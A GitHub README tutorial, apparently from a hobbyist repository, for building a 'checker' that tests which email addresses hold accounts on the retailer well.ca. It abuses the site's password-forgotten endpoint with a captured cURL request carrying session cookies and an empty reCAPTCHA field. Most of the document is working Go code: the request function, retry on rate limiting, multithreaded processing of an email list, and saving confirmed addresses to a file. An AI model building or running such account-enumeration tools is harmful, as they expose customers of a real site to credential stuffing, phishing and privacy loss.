## <h3>Wellca checker | Tutorial</h3>

<h6>Simple checker tutorial</h6>

---

<p>
    <img src="https://i.ytimg.com/vi/3_B9FPuzQ68/maxresdefault.jpg" alt="preview" width="300px"/><br/>
</p>

---

<h4>Introduction</h4>

Wellca is a famous skincare/healthstore. <br/>
I made an email checker on it for a tutorial.

---

<h4>Usage</h4>

<p>
    <img src="https://cdn.discordapp.com/attachments/1065385280393203892/1206975539408281650/image.png?ex=65ddf691&is=65cb8191&hm=5bbbebe80ea52ce3474edcbb622c4a1dbca66bf143bab3a2c688e764a7322952&" alt="preview" width="400px"/><br/>
</p>

---

<h4>Example</h4>

`./wellca_checker -f email_list.txt -o output.txt`

---

<h4>Features</h4>

- Proxyless, retrying on rate limited
- Debug mode
- Multithreading

---

<h4>Tutorial</h4>

You will need to first find a website, where you can signin or have an options where you forgot password.

For this example I will be using a famous selfcare website in Canada <a>https://well.ca/</a>

You will have to open the network tab and do a request when you login or forgot email.
<img src="https://cdn.discordapp.com/attachments/1065385280393203892/1207453583444803616/image.png?ex=65dfb3c7&is=65cd3ec7&hm=6bda300e5c3d12fe6129fa7a6653447832f1354ce8dbdefe6e3ca2919cffe472&" alt="network tab"/>

After that you will need to right click, copy value, copy as cURL.

You should have a long blob. You can ask chatGPT to convert to this a golang request or whatever. There is also python cURL converter, etc.

This is what I had

```go
curl 'https://well.ca/ajax_index.php?main_page=password_forgotten&action=process' -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'X-NewRelic-ID: VQ8BWFdTDBABXVlRAgcPUVM=' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://well.ca' -H 'Connection: keep-alive' -H 'Referer: https://well.ca/' -H 'Cookie: cookie_test=please_accept_for_session; bkd=62b39d507304fd8d55b95ba1f085a4bd; _gcl_au=1.1.1464452468.1707696512; well_id=eggjbfcad5gbmn1oi1dmbhmbg3' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'TE: trailers' --data-raw 'email_address=test%40hotmail.com&g-recaptcha-response='
```

Converted to golang

```go
func Check(email string) bool {
	url := "https://well.ca/ajax_index.php?main_page=password_forgotten&action=process"

	payload := bytes.NewBuffer([]byte(fmt.Sprintf("email_address=%s", email)))

	req, err := http.NewRequest("POST", url, payload)

	if err != nil {
		if common.Opts.Debug {
			fmt.Println(err)
		}
		return false
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("X-NewRelic-ID", "VQ8BWFdTDBABXVlRAgcPUVM=")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Cookie", "cookie_test=please_accept_for_session; bkd=62b39d507304fd8d55b95ba1f085a4bd; _gcl_au=1.1.1464452468.1707696512; well_id=ggld6s120b0advkci3j078ggd7")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Referer", "https://well.ca/categories/facial-skin-care_346.html")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		if common.Opts.Debug {
			fmt.Println(err)
		}
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		Check(email)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		if common.Opts.Debug {
			fmt.Println(err)
		}
		return false
	}

	if common.Opts.Debug {
		fmt.Println(string(body))
	}

	var response response

	if err := json.Unmarshal(body, &response); err != nil {
		if common.Opts.Debug {
			fmt.Println(err)
		}
		return false
	}
	return response.Success
}
```

Once you are at this stage, you basically have a checker, you need to make it check email dynamically.
This is usually done by reading a file and processing them via multi-threading.

```go
func ReadFile(fileName string) ([]string, error) {
	file, err := os.ReadFile(fileName)
	if err != nil {
		return nil, errors.New("unable to read file")
	}

	lines := strings.Split(string(file), "\n")

	return lines, nil
}
```

```go
semaphore = make(chan struct{}, common.Opts.Goroutine)

var wg sync.WaitGroup

for _, email := range emails {
	wg.Add(1)
	go checkEmail(email, &wg)
}

wg.Wait()
close(semaphore)
```

```go
func checkEmail(email string, wg *sync.WaitGroup) {
	defer wg.Done()

	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	if internal.Check(email) {
		fmt.Printf("[!] %s%s%s\n", common.TextBlue, common.TextReset, email)
		atomic.AddInt64(&common.NumberOfValidEmails, 1)

		if err := pkg_io.WriteToFile(common.Opts.Output, email); err != nil {
			log.Fatal(err)
		}
	} else {
		atomic.AddInt64(&common.NumberOfInvalidEmails, 1)
		fmt.Printf("[%s!%s] %s\n", common.TextRed, common.TextReset, email)
	}
}
```

I use a semaphore to have a number fix of thread, once the channel is full, we wait till it finish one task, etc.

Once you can read the file, check the email. You only need to write the correct email in a file.

```go
func WriteToFile(fileName string, message string) error {
	fileMutex.Lock()
	defer fileMutex.Unlock()

	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	if _, err := file.WriteString(message + "\n"); err != nil {
		return err
	}
	return nil
}
```

The rest of the code is mostly for the aesthetic and make something clear like taking input, text in color, clear console, display things.

I hope this tutorial can help you, you can always talk to me via discord, telegram, etc. Everything is linked on my readme.

Have fun!

---

<h4>Warning</h4>

- This project was made for educational purposes only! I take no responsibility for anything you do with this program.
- If you have any suggestions, problems, open a problem (if it is an error, you must be sure to look if you can solve it with [Google](https://giybf.com)!)

<h4>Support me</h4>

- Thanks for looking at this repository, you can donate btc to `bc1q0jc0dd6a7alzmr8j7hseg6r5d8333re9wu87wj`
- Made by [imzoloft](https://gitlab.com/imzoloft).

<div align="center">
    <b>Informations</b><br>
    <img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/imzoloft/wellca-checker-tutorial?color=000">
    <img alt="GitHub top language" src="https://img.shields.io/github/languages/top/imzoloft/wellca-checker-tutorial?color=000">
    <img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/imzoloft/wellca-checker-tutorial?color=000">
    <img alt="GitHub" src="https://img.shields.io/github/license/imzoloft/wellca-checker-tutorial?color=000">
    <img alt="GitHub watchers" src="https://img.shields.io/github/watchers/imzoloft/wellca-checker-tutorial?color=000">
</div>
```
